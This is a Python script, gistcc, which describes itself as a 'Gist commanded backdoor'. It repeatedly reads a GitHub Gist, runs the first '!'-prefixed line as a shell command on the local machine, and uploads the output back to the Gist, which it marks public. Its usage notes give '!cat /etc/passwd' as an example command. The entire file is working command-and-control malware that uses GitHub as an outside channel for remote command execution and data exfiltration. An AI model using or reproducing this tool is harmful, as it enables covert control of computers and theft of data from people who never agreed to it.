#!/usr/bin/python3

#=========================================================================================
#    About gistcc:
#    *Gist/Git-commanded Bot 
#    *gistcc parses selected Gist @github, identifies commands and executes them locally
#    *command outputs are stored on Gist as well prividing primitive console
#    
#    Prerequisite: existing account on GitHub with generated access token to Git
#
#    Command examples:
#    Create a new Gist: $gistcc.py --new NEW_GIST_NAME --token YOUR_GIT_TOKEN
#    Run gistcc: $gistcc.py --name GIST_NAME --id GIST_ID --token YOUR_GIT_TOKEN
#    Delete existing Gist: $gistcc.py --delete --id GIST_ID --token YOUR_GIT_TOKEN
#    
#    Gist command syntax (put the following to your Gist):
#     !commmand (first occurence of !command is executed on local machine)
#     !cat /etc/passwd
#     !xterm mc 
#     ?-t20 (sets timeout for command runtime to 20 seconds. Concerns only console commands, not external processes)
#
#
#=========================================================================================

import argparse
import subprocess
import time
import json
import requests
import multiprocessing

parser = argparse.ArgumentParser(description='Gist commanded backdoor')
parser.add_argument('--token', action='store', required=True, help='Git API Token, e.g. xxxxxxxxxxxxxxxxxxxxxxxxx')
parser.add_argument('--name', action='store', help='Gist Name, e.g. abc123')
parser.add_argument('--id', action='store', help='Gist ID number, e.g. yyyyyyyyyyyyyyy')
parser.add_argument('--new', action='store', help='New Gist Name to create')
parser.add_argument('--delete', action='store_true', help='Delete Gist specified by --id')
args = parser.parse_args()

token = "token "+args.token
url = "https://api.github.com/gists"
if args.name: gistName = str(args.name)
if args.id: gistUrl = "https://api.github.com/gists/"+args.id
if args.new: newGist = args.new
if args.new: newGist = args.new


def runCmd():
    outVar = ""
    '''stderr posielam tiez na stdout'''
    proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    print("Subprocess executed\n")
    while True:
        outputStd = proc.stdout.readline()
        if not outputStd:
            break
#        if proc.poll() is not None:
#            break
        if outputStd:
            print(outputStd.decode('UTF-8').rstrip())
            outVar += outputStd.decode('UTF-8')
    '''upload command output na Gist'''
    toUploadAll = "#"+command+"\n("+time.ctime()+")\n\n"+outVar
    updateHeader = {'Authorization': token}
    updatePayload = {"description": "updated desc","public": "true","files": {gistName: {"content": toUploadAll}}}
    reqUpdate = requests.patch(gistUrl, headers=updateHeader, data=json.dumps(updatePayload))
    print("Command output uploaded...Check Gist.\n")

def createGist():
    try:
        updateHeader = {'Authorization': token}
        updatePayload = {"description": "new gist","public": "true","files": {newGist: {"content": "new Gist content"}}}
        reqNewGist = requests.post(url, headers=updateHeader, data=json.dumps(updatePayload))
        jsonData = reqNewGist.json()
        print("Your new Gist Name is:", args.new)
        print("Your new Gist ID is:", jsonData['id'])
        print("Ready to run: $gistcc.py --name GIST_NAME --id GIST_ID --token YOUR_GIT_TOKEN")
    except requests.exceptions.RequestException as e:
        print("Connection refused...")
        exit(0)
    else:
        if 'message' in jsonData:
            if jsonData['message'] == "Bad credentials":
                print("Bad credentials/token")
                exit(0)
        exit(0)


def delGist():
    try:
        updateHeader = {'Authorization': token}
        reqNewGist = requests.delete(gistUrl, headers=updateHeader)
        print("Gist ID", args.id, "deleted from GitHub.")
        exit(0)
    except requests.exceptions.RequestException as e:
        print("Connection refused...")
        exit(0)
    else:
        if 'message' in jsonData:
            if jsonData['message'] == "Bad credentials":
                print("Bad credentials/token")
                exit(0)
        exit(0)


if args.new: createGist()
if args.delete: delGist()

last = None
defTimeout = 6

while True:
    '''================= taham data z gist-u ===================='''
    try:
        authHeader = {'Authorization': token}
        getContent = requests.get(gistUrl, headers=authHeader)
        jsonData = getContent.json()
    except requests.exceptions.RequestException as e:
        print("Connection refused...")
        exit(0)
    else:
        if 'message' in jsonData: 
            if jsonData['message'] == "Bad credentials": 
                print("Bad credentials/token")
                exit(0)
        '''json data (key content) do list-u na identifikaciu commandu'''
        try:
            jsonDataList = jsonData['files'][gistName]['content'].split("\n")
        except:
            print("Some error...")
            exit(0)
#        print("jsonDataList: ",jsonDataList)
        for i in jsonDataList:
            cmdTimeout = None 
            if (len(i)>1 and i[0] == "?" and i[1:3]=="-t"):
                '''?-t20 nastavi timeout na 20 sekund'''
                cmdTimeout = int(i[3:])
                break
        for i in jsonDataList:
            '''i existuje (proti prazdnym riadkom), musi zacinat na "!", a mat aspon 1 pismeno za vykricnikom => command'''
            commandsFound = 0
            if (len(i)>1 and i[0] == "!" and i[1].isalpha()):
                '''ak najdem prvy retazec zacinajuci na !, co je relevantny command a odrezem '!' '''
                command = i[1:]
                if command != last: 
                    commandsFound += 1
                    print("New command found @Gist:", i[1:])
                    if cmdTimeout: print("Command timeout found and set to:", cmdTimeout, "seconds.")
                '''for-cycle break(cycle end). Spusti command.'''
                break
        if commandsFound == 0: 
            print("NO new command found @Gist")
            '''while-cycle continue(new while run)'''
            time.sleep(defTimeout)
            continue

        '''==================== spusti runCmd() - zapis do premennej a upload =========================='''
        if command != last:
            if __name__ == '__main__':
                'multiprocessing viem terminovat, modul threading nie'''
                p = multiprocessing.Process(target=runCmd)
                p.start()
                last = None
                '''ochrana proti prinizkemu timeoutu. Mohlo by locknut Git API'''
                if not cmdTimeout: cmdTimeout = defTimeout
                if (cmdTimeout < 5) or (cmdTimeout > 120): cmdTimeout = defTimeout
                '''cakam minimalne defTimeout sekund, aby som nespamoval API'''
                time.sleep(defTimeout)
                '''ceste cakam do zvysku cmdTimeout-u, ak command neskoncil. Ak skoncil, ide novy While.'''
                if p.is_alive(): time.sleep(cmdTimeout-defTimeout)
                '''ukonci beh, ak cmd este stake bezi aj po vycerpani cmdTimeout-u'''
                if p.is_alive(): 
                    p.terminate()               
                    timeoutError = ("No output. \n Command did not finish within defined timeout of "+str(cmdTimeout)+
                    " seconds...\n Command running too long (e.g. #ping localhost -c 9999) or has no output (e.g. #xterm mc)")
                    toUploadError = "#"+command+"\n("+time.ctime()+")\n\n"+timeoutError 
                    updateHeader = {'Authorization': token}
                    updatePayload = {"description": "updated desc","public": "true","files": {gistName: {"content": toUploadError}}}
                    reqUpdate = requests.patch(gistUrl, headers=updateHeader, data=json.dumps(updatePayload))
                    print("Timeout error...Check Gist.\n")

#call script


